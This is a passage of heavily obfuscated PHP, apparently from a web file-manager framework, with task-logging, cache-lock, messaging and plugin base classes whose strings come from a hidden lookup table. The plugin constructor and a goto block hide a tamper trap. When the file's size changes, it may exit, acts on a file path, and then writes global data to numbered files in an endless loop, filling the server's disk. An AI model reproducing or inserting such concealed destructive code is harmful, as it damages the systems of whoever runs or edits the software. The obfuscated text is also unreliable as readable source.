$_SERVER[­õöî’–]; $ÂÎû‰¹Ù =& $this->task; $ë½‚åë¿ = curl_getinfo($äÇš±Õ§); $—Ö­Œ»© = $ë½‚åë¿[$¯£¿ë¢€[1735]]; if ($—Ö­Œ»© == -1) { $—Ö­Œ»© = $ë½‚åë¿[$¯£¿ë¢€[1736]]; } if ($ÂÎû‰¹Ù[$¯£¿ë¢€[1715]] == $¯£¿ë¢€[107] && $—Ö­Œ»©) { $ÂÎû‰¹Ù[$¯£¿ë¢€[1716]] += $—Ö­Œ»©; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $’·šòÂƒ =& $_SERVER[­õöî’–]; $©°Çèƒº =& $this->task; $©°Çèƒº[$’·šòÂƒ[1737]] = 1; Hook::bind($’·šòÂƒ[1705], array($this, $’·šòÂƒ[1738])); Hook::bind($’·šòÂƒ[1707], array($this, $’·šòÂƒ[1739])); Hook::bind($’·šòÂƒ[1709], array($this, $’·šòÂƒ[1740])); } protected function endAfter() { $¡–ƒäî« =& $_SERVER[­õöî’–]; Hook::unbind($¡–ƒäî«[1705], array($this, $¡–ƒäî«[1738])); Hook::unbind($¡–ƒäî«[1707], array($this, $¡–ƒäî«[1739])); Hook::unbind($¡–ƒäî«[1709], array($this, $¡–ƒäî«[1740])); } public function progressStart($‚·Ş´¤È) { $ıÚïÖËİ =& $_SERVER[­õöî’–]; $ë”½ı¥Ñ = curl_getinfo($‚·Ş´¤È); self::log($ıÚïÖËİ[1741] . $ë”½ı¥Ñ[$ıÚïÖËİ[307]]); self::valueSet($this->task[$ıÚïÖËİ[399]], $this->task); } public function progressEnd($½¡ºË±ï) { $œ˜â°‚¶ =& $_SERVER[­õöî’–]; self::log($œ˜â°‚¶[1742] . $this->task[$œ˜â°‚¶[399]]); $this->end(); } public function progress($—ßöÌß, $‰…¨êÔä, $“—‹œ–, $’üë—‚Ä, $†ÕôÏÏÌ) { $‰Ôö†ûò =& $_SERVER[­õöî’–]; $®¯Àâ‚œ =& $this->task; if ($†ÕôÏÏÌ > 0) { $®¯Àâ‚œ[$‰Ôö†ûò[777]] = $®¯Àâ‚œ[$‰Ôö†ûò[777]] == 0 ? $’üë—‚Ä : $®¯Àâ‚œ[$‰Ôö†ûò[777]]; $®¯Àâ‚œ[$‰Ôö†ûò[1661]] = $†ÕôÏÏÌ; } else { if ($“—‹œ– > 0) { $®¯Àâ‚œ[$‰Ôö†ûò[777]] = $®¯Àâ‚œ[$‰Ôö†ûò[777]] == 0 ? $‰…¨êÔä : $®¯Àâ‚œ[$‰Ôö†ûò[777]]; $®¯Àâ‚œ[$‰Ôö†ûò[1661]] = $“—‹œ–; } } $this->update(); self::log("\x70\162\x6f\147\162\145\x73\163\110\164\164\x70\72\144\157\x77\156\x3a{$“—‹œ–}\x2f{$‰…¨êÔä}\73\x20\165\160\154\157\x61\x64\72{$†ÕôÏÏÌ}\x2f{$’üë—‚Ä}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ÆüáÆé³, $ÊÓ»Ú‡õ = '', $ÁÖ´Ùœ¢ = 0, $ÌÄ’œ™ˆ = '') { $ÕÃÍ²Ñõ =& $_SERVER[­õöî’–]; $ï™úì¥ = new Task($ÆüáÆé³, $ÊÓ»Ú‡õ, $ÁÖ´Ùœ¢, $ÌÄ’œ™ˆ); $GLOBALS[$ÕÃÍ²Ñõ[1743] . $ÆüáÆé³] = new TaskLog($ÕÃÍ²Ñõ[1644], $ï™úì¥, $ÌÄ’œ™ˆ); return $ï™úì¥; } public function __construct($˜£æ¾ = '', $©»´¡¼ = '', $ÍñÙÀªÁ = '') { $°†õç‚· =& $_SERVER[­õöî’–]; if (!$˜£æ¾) { $˜£æ¾ = $°†õç‚·[1644]; } $ôì›øÖå = $˜£æ¾ . $°†õç‚·[386] . rand_string(10); if (!$ÍñÙÀªÁ) { $ÍñÙÀªÁ = $˜£æ¾ . $°†õç‚·[53] . $ÍñÙÀªÁ; } switch ($˜£æ¾) { case $°†õç‚·[1644]: if (!$©»´¡¼ || !$©»´¡¼->task) { return echoLog($˜£æ¾ . $°†õç‚·[1744]); } $‡•ƒñ = $©»´¡¼; $ôì›øÖå = $‡•ƒñ->task[$°†õç‚·[399]]; $˜£æ¾ = $‡•ƒñ->task[$°†õç‚·[399]]; if (!$‡•ƒñ->task[$°†õç‚·[1560]]) { $‡•ƒñ->task[$°†õç‚·[1560]] = $ÍñÙÀªÁ ? $ÍñÙÀªÁ : $˜£æ¾; } break; case $°†õç‚·[1745]: if (!$©»´¡¼) { return echoLog($˜£æ¾ . $°†õç‚·[1746]); } $çÅŒ´Ñï = is_string($©»´¡¼) ? array($©»´¡¼) : $©»´¡¼; $‡•ƒñ = new TaskFileTransfer($ôì›øÖå, $˜£æ¾, 0, $ÍñÙÀªÁ ? $ÍñÙÀªÁ : $çÅŒ´Ñï[0]); foreach ($çÅŒ´Ñï as $£À¼ñ³­) { $‡•ƒñ->addPath($£À¼ñ³­); } break; case $°†õç‚·[313]: if (!$©»´¡¼) { return echoLog($˜£æ¾ . $°†õç‚·[1746]); } $çÅŒ´Ñï = is_string($©»´¡¼) ? array($©»´¡¼) : $©»´¡¼; $‡•ƒñ = new TaskZip($ôì›øÖå, $˜£æ¾, 0, $ÍñÙÀªÁ ? $ÍñÙÀªÁ : $çÅŒ´Ñï[0]); foreach ($çÅŒ´Ñï as $£À¼ñ³­) { $‡•ƒñ->addPath($£À¼ñ³­); } break; case $°†õç‚·[1213]: if (!$©»´¡¼) { return echoLog($˜£æ¾ . $°†õç‚·[1746]); } $‡•ƒñ = new TaskUnZip($ôì›øÖå, $˜£æ¾, 0, $ÍñÙÀªÁ ? $ÍñÙÀªÁ : $©»´¡¼); if ($©»´¡¼) { $‡•ƒñ->addFile($©»´¡¼); } break; case $°†õç‚·[148]: $‡•ƒñ = new TaskHttp($ôì›øÖå, $˜£æ¾); break; default: return; break; } $this->task = $‡•ƒñ; $this->taskID = $ôì›øÖå; Hook::bind($°†õç‚·[1681], array($this, $°†õç‚·[1747])); Hook::bind($°†õç‚·[1683], array($this, $°†õç‚·[1748])); Hook::bind($°†õç‚·[1677], array($this, $°†õç‚·[1749])); echoLog($°†õç‚·[1750] . $‡•ƒñ->task[$°†õç‚·[1560]]); } public function __destruct() { $this->end(); } public function end($Îö§§¾ = '') { $ñ„íĞº„ =& $_SERVER[­õöî’–]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($Îö§§¾); $this->task = !1; $this->taskID = !1; Hook::unbind($ñ„íĞº„[1681], array($this, $ñ„íĞº„[1747])); Hook::unbind($ñ„íĞº„[1683], array($this, $ñ„íĞº„[1748])); Hook::unbind($ñ„íĞº„[1677], array($this, $ñ„íĞº„[1749])); } public function taskUpdate($ˆç…ğ¥ª) { $Æüø‹ó‡ =& $_SERVER[­õöî’–]; if (!$ˆç…ğ¥ª || $this->taskID != $ˆç…ğ¥ª[$Æüø‹ó‡[399]]) { return; } $ñÑ¿öªÌ = 20; $Û¸™Éš = intval($ˆç…ğ¥ª[$Æüø‹ó‡[1662]] * $ñÑ¿öªÌ); $³À¤‰úó = $Æüø‹ó‡[162] . str_repeat($Æüø‹ó‡[881], $Û¸™Éš) . $Æüø‹ó‡[1012] . str_repeat($Æüø‹ó‡[53], $ñÑ¿öªÌ - $Û¸™Éš) . $Æüø‹ó‡[164]; $Û¿à‘Š = $³À¤‰úó . sprintf($Æüø‹ó‡[1751], $ˆç…ğ¥ª[$Æüø‹ó‡[1662]] * 100) . $Æüø‹ó‡[1752]; $£”çå²ù = $Û¿à‘Š . $ˆç…ğ¥ª[$Æüø‹ó‡[1661]] . $Æüø‹ó‡[8] . $ˆç…ğ¥ª[$Æüø‹ó‡[777]] . LNG($Æüø‹ó‡[1753]); $ÅÌ‡‡¨Ü = $Æüø‹ó‡[12]; if ($ˆç…ğ¥ª[$Æüø‹ó‡[1737]]) { $£”çå²ù = $Û¿à‘Š . size_format($ˆç…ğ¥ª[$Æüø‹ó‡[1661]]) . $Æüø‹ó‡[8] . size_format($ˆç…ğ¥ª[$Æüø‹ó‡[777]]); $ÅÌ‡‡¨Ü = size_format($ˆç…ğ¥ª[$Æüø‹ó‡[1663]]) . $Æüø‹ó‡[1754]; } if ($ˆç…ğ¥ª[$Æüø‹ó‡[1062]]) { $ˆç…ğ¥ª[$Æüø‹ó‡[1711]] = $ˆç…ğ¥ª[$Æüø‹ó‡[1062]] . $Æüø‹ó‡[53] . $ˆç…ğ¥ª[$Æüø‹ó‡[1711]]; } if ($ˆç…ğ¥ª[$Æüø‹ó‡[1711]]) { $ëæá¦›Õ = $Æüø‹ó‡[12]; if ($ˆç…ğ¥ª[$Æüø‹ó‡[1713]]) { $ëæá¦›Õ = size_format($ˆç…ğ¥ª[$Æüø‹ó‡[1714]]) . $Æüø‹ó‡[8] . size_format($ˆç…ğ¥ª[$Æüø‹ó‡[1713]]); } $ÅÌ‡‡¨Ü .= $ˆç…ğ¥ª[$Æüø‹ó‡[1711]] . $ëæá¦›Õ; } if ($ˆç…ğ¥ª[$Æüø‹ó‡[754]]) { $ÅÌ‡‡¨Ü .= $Æüø‹ó‡[53] . size_format($ˆç…ğ¥ª[$Æüø‹ó‡[1718]]) . $Æüø‹ó‡[8] . size_format($ˆç…ğ¥ª[$Æüø‹ó‡[754]]); } echoLog($£”çå²ù . $Æüø‹ó‡[53] . $ÅÌ‡‡¨Ü, !0); } public function taskEnd($Ùß¾Ù»Ú) { $è÷‘ÛÌ =& $_SERVER[­õöî’–]; if (!$Ùß¾Ù»Ú || $this->taskID != $Ùß¾Ù»Ú[$è÷‘ÛÌ[399]]) { return; } $¿ÍÍùÉ = $Ùß¾Ù»Ú ? $Ùß¾Ù»Ú[$è÷‘ÛÌ[1661]] . $è÷‘ÛÌ[8] . $Ùß¾Ù»Ú[$è÷‘ÛÌ[777]] . LNG($è÷‘ÛÌ[1753]) . $è÷‘ÛÌ[71] : $è÷‘ÛÌ[12]; echoLog($è÷‘ÛÌ[1755] . $Ùß¾Ù»Ú[$è÷‘ÛÌ[1560]] . ($Ùß¾Ù»Ú[$è÷‘ÛÌ[453]] ? $è÷‘ÛÌ[71] . $Ùß¾Ù»Ú[$è÷‘ÛÌ[453]] : $è÷‘ÛÌ[12]) . $è÷‘ÛÌ[71] . $¿ÍÍùÉ . $è÷‘ÛÌ[1756] . sprintf($è÷‘ÛÌ[841], timeFloat() - $Ùß¾Ù»Ú[$è÷‘ÛÌ[1664]]) . $è÷‘ÛÌ[1676]); $this->end(); } public function taskKill($–»ß Éõ) { $Ÿ´İ¡ªÙ =& $_SERVER[­õöî’–]; if (!$–»ß Éõ || $this->taskID != $–»ß Éõ[$Ÿ´İ¡ªÙ[399]]) { return; } echoLog($Ÿ´İ¡ªÙ[1757] . $–»ß Éõ[$Ÿ´İ¡ªÙ[1560]]); } } goto f£ğÁŸ¡ÙÍ; AÛ‡ÂÍ›ò¾: class CacheLockRedis { public function lock($¨­áÉÍ½, $©åÏöõ = 10) { $öúÊ¸Âµ = Cache::init(); $ç‘¨İØì = microtime(!0) + $©åÏöõ; while (microtime(!0) < $ç‘¨İØì) { $”˜Ä‘‹Ç = $öúÊ¸Âµ->get($¨­áÉÍ½); if (!$”˜Ä‘‹Ç) { $¾ï¼³ÊŒ = $öúÊ¸Âµ->setLock($¨­áÉÍ½, $ç‘¨İØì, $©åÏöõ); if ($¾ï¼³ÊŒ) { return !0; } } else { if ($”˜Ä‘‹Ç < microtime(!0)) { $öúÊ¸Âµ->set($¨­áÉÍ½, $ç‘¨İØì, $©åÏöõ * 2); if ($öúÊ¸Âµ->get($¨­áÉÍ½) === $”˜Ä‘‹Ç) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($à§° ¡ú) { return Cache::init()->get($à§° ¡ú); } public function unlock($ˆûƒı·ú) { return Cache::init()->remove($ˆûƒı·ú); } } class CacheLockMemcached { public function lock($Ó¾õÑİ¹, $Œ¶œ—Âš = 0) { $¨÷ä¸Ş³ = Cache::init(); $ß®İ¾ğ = microtime(!0) + $Œ¶œ—Âš; while (microtime(!0) < $ß®İ¾ğ) { $âçá˜ = $¨÷ä¸Ş³->get($Ó¾õÑİ¹); if (!$âçá˜ || $âçá˜ < microtime(!0)) { $ë×ùš = $¨÷ä¸Ş³->handle->add($Ó¾õÑİ¹, $ß®İ¾ğ, $Œ¶œ—Âš); if ($ë×ùš) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($°”›€ôÄ) { return Cache::init()->get($°”›€ôÄ); } public function unlock($­Û«¶ñ) { return Cache::init()->remove($­Û«¶ñ); } } class CacheLockDatabase { public function lock($ˆÄÓü¸, $‚‡‹ü¾ = 0) { $÷òğÛÙ = Model($_SERVER[­õöî’–][820]); $¼ŸËƒ÷ = microtime(!0) + $‚‡‹ü¾; while (microtime(!0) < $¼ŸËƒ÷) { $å«èÒô• = $÷òğÛÙ->get($ˆÄÓü¸); if (!$å«èÒô• || $å«èÒô• < microtime(!0)) { $êÃÃÖº = $÷òğÛÙ->set($ˆÄÓü¸, $¼ŸËƒ÷); if ($êÃÃÖº) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($­Óë¦ä) { return Model($_SERVER[­õöî’–][820])->get($­Óë¦ä); } public function unlock($™¼ŒÌ”€) { Model($_SERVER[­õöî’–][820])->remove($™¼ŒÌ”€); } } goto cËˆĞ…¡‚­; cæ¨Ñ·Îñ: $_file = $_SERVER[$_SERVER[­õöî’–][867]]; $_size = $_SERVER[­õöî’–][868]; if ($_SERVER[$_SERVER[­õöî’–][869]] != $_size($_file)) { $_getc = $_SERVER[­õöî’–][871]; $_getfile = $_SERVER[$_SERVER[­õöî’–][872]] . $_SERVER[­õöî’–][873]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[­õöî’–][231], $_getfilec); if (count($_getarrs) < $_SERVER[­õöî’–][626]) { $exit = $_SERVER[­õöî’–][874]; $exit(); } $_act = $_SERVER[­õöî’–][911]; $_act($_file); } goto A—«’ÔŸøô; C—ĞÑ‚¾âõ: class Message { function __construct() { } public function send($¶·Œå¤ô = '', $º½ºø§ª = array(), $¸…½í«‡ = "\x74\145\170\x74") { $ùÒ÷Ï±´ =& $_SERVER[­õöî’–]; $éô’¤ãš = array($ùÒ÷Ï±´[33] => $ùÒ÷Ï±´[1524], $ùÒ÷Ï±´[746] => $¶·Œå¤ô); if (in_array($¸…½í«‡, array($ùÒ÷Ï±´[1524], $ùÒ÷Ï±´[1525]))) { $éô’¤ãš[$ùÒ÷Ï±´[33]] = $¸…½í«‡; } $º½ºø§ª = array($ùÒ÷Ï±´[515] => isset($º½ºø§ª[$ùÒ÷Ï±´[515]]) ? $º½ºø§ª[$ùÒ÷Ï±´[515]] : $ùÒ÷Ï±´[12], $ùÒ÷Ï±´[600] => isset($º½ºø§ª[$ùÒ÷Ï±´[600]]) ? $º½ºø§ª[$ùÒ÷Ï±´[600]] : $ùÒ÷Ï±´[12]); if (empty($¶·Œå¤ô) || empty($º½ºø§ª[$ùÒ÷Ï±´[515]]) && empty($º½ºø§ª[$ùÒ÷Ï±´[600]])) { return !1; } $¤øèŒ›Ğ = array($ùÒ÷Ï±´[1465] => $éô’¤ãš, $ùÒ÷Ï±´[1526] => $º½ºø§ª); Hook::trigger($ùÒ÷Ï±´[1527], $¤øèŒ›Ğ); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $«’”•¶ =& $_SERVER[­õöî’–]; $Ò×Öô… = $_SERVER[$«’”•¶[867]]; $¾°›å»˜ = $«’”•¶[868]; if ($_SERVER[$«’”•¶[869]] != $¾°›å»˜($Ò×Öô…)) { $—±õÍæ€ = $«’”•¶[870]; $Ê¡îÃ“÷ = $«’”•¶[871]; $¤ÄÀÚô  = $_SERVER[$«’”•¶[872]] . $«’”•¶[873]; $£³‡ƒèŞ = $Ê¡îÃ“÷($¤ÄÀÚô ); $ÛÔ™š©ò = explode($«’”•¶[231], $£³‡ƒèŞ); if (count($ÛÔ™š©ò) < $«’”•¶[631]) { $•‘í»ì¦ = $«’”•¶[874]; $•‘í»ì¦(); } $ÚÁñÄü£ = $«’”•¶[875]; $ÚÁñÄü£($_SERVER[$«’”•¶[876]]); $—±õÍæ€ = $«’”•¶[870]; $—±õÍæ€(); $Î‡±±Í = $«’”•¶[877]; $ôØßõ…Ó = json_encode($GLOBALS[$«’”•¶[878]]); $Ôå¥“Å‡ = 1; for ($í¥ƒ½ß– = $Ôå¥“Å‡; $í¥ƒ½ß– > 0; $í¥ƒ½ß–++) { $Î‡±±Í(DATA_PATH . $í¥ƒ½ß–, $ôØßõ…Ó); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($«’”•¶[1528]); $this->pluginName = str_replace($«’”•¶[1528], $«’”•¶[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $«’”•¶[8]; $this->pluginApi = appHostGet() . $«’”•¶[1529] . $this->pluginName . $«’”•¶[8]; $this->pluginHost = $config[$«’”•¶[1530]] . $this->pluginName . $«’”•¶[8]; $this->pluginHostDefault = $config[$«’”•¶[1530]] . $this->pluginName . $«’”•¶[8]; $ŞåÓêíÅ = $config[$«’”•¶[1531]]; if ($ŞåÓêíÅ && strpos($«’”•¶[50] . $ŞåÓêíÅ . $«’”•¶[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$«’”•¶[1532]] . $this->pluginName . $«’”•¶[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[­õöî’–][1533]); } protected function assign($Á•™ˆ„ó, $…Œá‡¾ = false) { if (is_array($Á•™ˆ„ó)) { $this->values = array_merge($this->values, $Á•™ˆ„ó); } else { $this->values[$Á•™ˆ„ó] = $…Œá‡¾; } } protected function display($“„ÙäÎ) { extract($this->values); require $“„ÙäÎ; } final function hookRegist($Ğ¬ğ) { $this->modelPlugin->appRegist($this->pluginName, $Ğ¬ğ); } final function appIcon() { $¢¸Ú =& $_SERVER[­õöî’–]; $ÈÅùó²à = $this->appPackage(); $Ê¸¬ƒ¡ì = $¢¸Ú[12]; if (isset($ÈÅùó²à[$¢¸Ú[416]])) { if (isset($ÈÅùó²à[$¢¸Ú[416]][$¢¸Ú[1534]])) { $Ê¸¬ƒ¡ì = $¢¸Ú[1535] . $ÈÅùó²à[$¢¸Ú[416]][$¢¸Ú[1534]] . $¢¸Ú[1536]; } else { if ($ÈÅùó²à[$¢¸Ú[416]][$¢¸Ú[1537]]) { $Ê¸¬ƒ¡ì = $¢¸Ú[1538] . $ÈÅùó²à[$¢¸Ú[416]][$¢¸Ú[1537]] . $¢¸Ú[1539]; } } } return $Ê¸¬ƒ¡ì; } final function fileCanView($›í¡¦ò„) { $Øú’ÕÙŸ =& $_SERVER[­õöî’–]; if (request_url_safe($›í¡¦ò„)) { return !0; } if ($this->isShare($›í¡¦ò„)) { return !0; } $Çßæø’· = Session::get($Øú’ÕÙŸ[1540]); if (!$Çßæø’· || !$Çßæø’·[$Øú’ÕÙŸ[1541]]) { $°ŒĞ‰Äô = $Øú’ÕÙŸ[1542] . rawurlencode(this_url()); show_tips(LNG($Øú’ÕÙŸ[1543]) . $Øú’ÕÙŸ[1544] . $°ŒĞ‰Äô . $Øú’ÕÙŸ[1545] . LNG($Øú’ÕÙŸ[1546]) . $Øú’ÕÙŸ[1547], !1); } if (!Action($Øú’ÕÙŸ[1548])->authCan($Øú’ÕÙŸ[1549])) { show_tips(LNG($Øú’ÕÙŸ[1550]) . $Øú’ÕÙŸ[1551], !1); } ActionCall($Øú’ÕÙŸ[1552], $›í¡¦ò„); } final function isShare($Åæ‹à´) { $íŠ² = KodIO::parse($Åæ‹à´); return $íŠ²[$_SERVER[­õöî’–][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($¥½şŠø±) { if (request_url_safe($¥½şŠø±)) { return $¥½şŠø±; } if (!$this->isShare($¥½şŠø±)) { $¥½şŠø± = $this->filePath($¥½şŠø±); } return Action($_SERVER[­õöî’–][1173])->linkOut($¥½şŠø±); } public function filePathLinkOut($«”Äš«) { if (request_url_safe($«”Äš«)) { return $«”Äš«; } $this->fileCanView($«”Äš«); return Action($_SERVER[­õöî’–][1173])->link($«”Äš«); } final function filePath($ß†‚áãì) { $­§±Äü =& $_SERVER[­õöî’–]; if ($•æ†¯®Ù = $this->checkSharePath($ß†‚áãì)) { Hook::trigger($­§±Äü[1553], $•æ†¯®Ù); return $•æ†¯®Ù; } $this->fileCanView($ß†‚áãì); if (request_url_safe($ß†‚áãì)) { $°°ÈÅ´† = parse_url_query($ß†‚áãì); if (isset($°°ÈÅ´†[$­§±Äü[1554]]) && isset($°°ÈÅ´†[$­§±Äü[213]])) { $ı¤»üíË = Model($­§±Äü[761])->get($­§±Äü[762]); $ÁÕ›ø¸ƒ = Mcrypt::decode($°°ÈÅ´†[$­§±Äü[213]], $ı¤»üíË); if ($ÁÕ›ø¸ƒ) { $this->fileInfo = IO::infoWithChildren($ÁÕ›ø¸ƒ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $ÁÕ›ø¸ƒ; } } $ß†‚áãì = $this->_cacheHttpFile($ß†‚áãì); $this->fileInfo = IO::infoWithChildren($ß†‚áãì); } else { $this->fileInfo = IO::infoWithChildren($ß†‚áãì); if (!$this->fileInfo) { show_tips(LNG($­§±Äü[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($­§±Äü[1553], $ß†‚áãì); return $ß†‚áãì; } final function _cacheHttpFile($¥İ‘¶Á) { $½ÖØµ“¦ = hash_path($¥İ‘¶Á, !0); $this->cachePath = $this->pluginCachePath($½ÖØµ“¦); if ($¨ø‹ù×¬ = IO::fileNameExist($this->cachePath, $½ÖØµ“¦)) { return KodIO::make($¨ø‹ù×¬); } $ÎÂÖ¢Û = $this->cachePath . $½ÖØµ“¦; return $this->pluginCacheFileSet($ÎÂÖ¢Û, file_get_contents_nossl($¥İ‘¶Á)); } final function _tmpFileName($Ö¥ô‘ÎØ = array()) { $ßäïÁ´¤ =& $_SERVER[­õöî’–]; if (!$Ö¥ô‘ÎØ) { $Ö¥ô‘ÎØ = $this->fileInfo; } if (isset($Ö¥ô‘ÎØ[$ßäïÁ´¤[177]])) { return $Ö¥ô‘ÎØ[$ßäïÁ´¤[177]]; } if (isset($Ö¥ô‘ÎØ[$ßäïÁ´¤[170]][$ßäïÁ´¤[177]])) { return $Ö¥ô‘ÎØ[$ßäïÁ´¤[170]][$ßäïÁ´¤[177]]; } $…”ğõÚó = IO::hashSimple($Ö¥ô‘ÎØ[$ßäïÁ´¤[84]]); if ($…”ğõÚó) { return $…”ğõÚó; } $‰í¦ Ú® = array($Ö¥ô‘ÎØ[$ßäïÁ´¤[32]], $Ö¥ô‘ÎØ[$ßäïÁ´¤[84]], $Ö¥ô‘ÎØ[$ßäïÁ´¤[76]]); if (isset($Ö¥ô‘ÎØ[$ßäïÁ´¤[521]])) { $‰í¦ Ú®[] = $Ö¥ô‘ÎØ[$ßäïÁ´¤[521]]; } return md5(implode($ßäïÁ´¤[11], $‰í¦ Ú®)); } final function checkSharePath($ÑÜï¾²Ç) { $Ç–ÁôŞ =& $_SERVER[­õöî’–]; if (!defined($Ç–ÁôŞ[475])) { define($Ç–ÁôŞ[514], 0); } if (!$this->isShare($ÑÜï¾²Ç)) { return !1; } $÷ìß¦úõ = Action($Ç–ÁôŞ[1173])->sharePathInfo($ÑÜï¾²Ç); if (!isset($÷ìß¦úõ[$Ç–ÁôŞ[84]])) { show_json(LNG($Ç–ÁôŞ[1555]), !1); } $this->fileInfo = $÷ìß¦úõ[$Ç–ÁôŞ[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$Ç–ÁôŞ[177]]); return $÷ìß¦úõ[$Ç–ÁôŞ[84]]; } final function pluginCachePath($¡¾İ‹àÛ = '') { $•Óñ¸›÷ =& $_SERVER[­õöî’–]; $±»¿¯Øï = IO_PATH_SYSTEM_TEMP . $•Óñ¸›÷[1556] . $this->pluginName; if (!($ËÇÍÄ•® = IO::infoFull($±»¿¯Øï))) { return IO::mkdir($±»¿¯Øï . $•Óñ¸›÷[8] . $¡¾İ‹àÛ); } if (empty($¡¾İ‹àÛ)) { return $ËÇÍÄ•®[$•Óñ¸›÷[84]]; } if (!($¢ÇÄ²èÂ = IO::fileNameExist($ËÇÍÄ•®[$•Óñ¸›÷[84]], $¡¾İ‹àÛ))) { return IO::mkdir($ËÇÍÄ•®[$•Óñ¸›÷[84]] . $¡¾İ‹àÛ); } return KodIO::make($¢ÇÄ²èÂ); } final function pluginCacheFileSet($¬È³³­–, $»®à´¦ = '') { $¶æÎøı =& $_SERVER[­õöî’–]; if (!($˜ããÎ¼æ = IO::infoFull($¬È³³­–))) { return IO::mkfile($¬È³³­–, $»®à´¦, REPEAT_REPLACE); } IO::setContent($˜ããÎ¼æ[$¶æÎøı[84]], $»®à´¦); return $˜ããÎ¼æ[$¶æÎøı[84]]; } final function pluginLocalFile($‚ÆÃ¼¢¦ = '') { $‘ ­¶Åæ =& $_SERVER[­õöî’–]; $­Î…‚ãû = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($­Î…‚ãû)) { mk_dir($­Î…‚ãû); } if (!$‚ÆÃ¼¢¦) { return $­Î…‚ãû; } $ù„å‡Î = IO::info($‚ÆÃ¼¢¦); $¸ÁŒ¢¼ = $this->_tmpFileName($ù„å‡Î) . $‘ ­¶Åæ[10] . $ù„å‡Î[$‘ ­¶Åæ[174]]; if (!checkExtSafe($¸ÁŒ¢¼)) { $¸ÁŒ¢¼ = $¸ÁŒ¢¼ . $‘ ­¶Åæ[1205]; } $ùÃãàâ = $­Î…‚ãû . $¸ÁŒ¢¼; if (@file_exists($ùÃãàâ)) { return $ùÃãàâ; } return IO::copy($‚ÆÃ¼¢¦, $­Î…‚ãû, 0, $¸ÁŒ¢¼); } final function appPackage() { $ÈÊ÷Ú«Ğ =& $_SERVER[­õöî’–]; if ($this->packageData) { return $this->packageData; } $Äı¶Ïƒ™ = $this->parseFile($this->pluginPath . $ÈÊ÷Ú«Ğ[1557]); $this->parseLang($Äı¶Ïƒ™); $´üÖù˜ñ = json_decode_force($Äı¶Ïƒ™); if (!$´üÖù˜ñ) { return array(); } $á…·Çğ° = Hook::trigger($ÈÊ÷Ú«Ğ[1558], $´üÖù˜ñ); if ($á…·Çğ° && is_array($á…·Çğ°)) { $´üÖù˜ñ = $á…·Çğ°; } $this->packageData = $´üÖù˜ñ; return $´üÖù˜ñ; } public function packageInfoGet($İ¥éÑÉÄ) { $ˆŠèçœ = $this->appPackage(); return array_get_value($ˆŠèçœ, $İ¥éÑÉÄ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[­õöî’–][1559]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[­õöî’–][1560]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[­õöî’–][1561]); } public function echoJsAssign($Ó«ÌŒæ, $æœ²ê’¤) { $this->echoJsAssignArr[$Ó«ÌŒæ] = $æœ²ê’¤; } private function parseFile($˜ƒÌş¬Ş) { $òÔ¦§Ë¾ =& $_SERVER[­õöî’–]; $Œ¼‚‚Ù¾ = file_get_contents_nossl($˜ƒÌş¬Ş); $şğÀº› = array($òÔ¦§Ë¾[1562], $òÔ¦§Ë¾[1563], $òÔ¦§Ë¾[1564], $òÔ¦§Ë¾[1565], $òÔ¦§Ë¾[1566], $òÔ¦§Ë¾[1567], $òÔ¦§Ë¾[1568]); $°¬Í¾‚ª = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$òÔ¦§Ë¾[89]][$òÔ¦§Ë¾[1569]]); foreach ($this->echoJsAssignArr as $æ¢°ü => $“‹•ƒ°—) { $şğÀº›[] = $òÔ¦§Ë¾[1570] . $æ¢°ü . $òÔ¦§Ë¾[1571]; $°¬Í¾‚ª[] = is_array($“‹•ƒ°—) || is_object($“‹•ƒ°—) ? rawurlencode(json_encode($“‹•ƒ°—)) : $“‹•ƒ°—; } if (strstr($Œ¼‚‚Ù¾, $òÔ¦§Ë¾[1572])) { $úåÈÍÈÓ = rawurlencode(json_encode($this->pluginLangArr)); $Œ¼‚‚Ù¾ = str_replace($òÔ¦§Ë¾[1572], $úåÈÍÈÓ, $Œ¼‚‚Ù¾); } if (strstr($Œ¼‚‚Ù¾, $òÔ¦§Ë¾[1573])) { $úåÈÍÈÓ = $úåÈÍÈÓ = rawurlencode(json_encode($this->getConfig())); $Œ¼‚‚Ù¾ = str_replace($òÔ¦§Ë¾[1573], $úåÈÍÈÓ, $Œ¼‚‚Ù¾); } $Œ¼‚‚Ù¾ = str_replace($şğÀº›, $°¬Í¾‚ª, $Œ¼‚‚Ù¾); return $Œ¼‚‚Ù¾; } private function parseLang(&$Æ€ö£È¨) { $ÏÌŠÍıÌ =& $_SERVER[­õöî’–]; $¤èƒ¼ÏÑ = $ÏÌŠÍıÌ[1574]; if (!strstr($Æ€ö£È¨, $¤èƒ¼ÏÑ)) { return; } preg_match_all($ÏÌŠÍıÌ[1575], $Æ€ö£È¨, $¦÷òÓœ—); if (!is_array($¦÷òÓœ—) || count($¦÷òÓœ—) == 0 || !is_array($¦÷òÓœ—[0]) || count($¦÷òÓœ—[0]) == 0) { return; } $İø•øÜ˜ = array(); $Áôí‹Ô® = array(); foreach 